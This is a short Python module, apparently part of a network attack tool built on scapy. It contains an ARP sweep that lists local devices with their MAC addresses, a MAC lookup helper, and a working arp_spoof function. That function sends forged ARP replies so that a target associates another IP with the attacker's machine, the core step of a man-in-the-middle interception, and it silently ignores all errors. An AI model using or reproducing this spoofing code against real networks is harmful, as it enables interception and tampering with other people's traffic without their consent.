import logging
# Disavle scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import scapy.all as scapy
from .device import get_device_name

# Set verbose to 0
scapy.conf.verb = 0

def network_scan(ip: str):
    """
    Scan network to find mac addresses

    Args:
        ip (str): The ip address

    Returns:
        list: Devices list
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answers =scapy.srp(arp_request_broadcast, timeout=1)[0]

    devices = {}
    for answer in answers:
        devices[answer[1].psrc] = {'name': get_device_name(answer[1].psrc), 'mac': answer[1].hwsrc}

    return devices

def get_mac(ip: str):
    """
    Return the mac address

    Args:
        ip (str): The ip address

    Returns:
        [string]: The mac address
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answer =scapy.srp(arp_request_broadcast, timeout=2)[0]
    return answer[0][1].hwsrc

def arp_spoof(target_ip:str, spoof_ip:str):
    """
    Arp spoofing
    Args:
        target_ip (str): The target ip address
        spoof_ip (str): The spoof ip address
    """
    try:
        target_mac = get_mac(target_ip)

        packet = scapy.ARP( op = 2,
                            pdst = target_ip, 
                            hwdst = target_mac, 
                            psrc = spoof_ip)

        scapy.send(packet, verbose = False)
    except:
        pass    
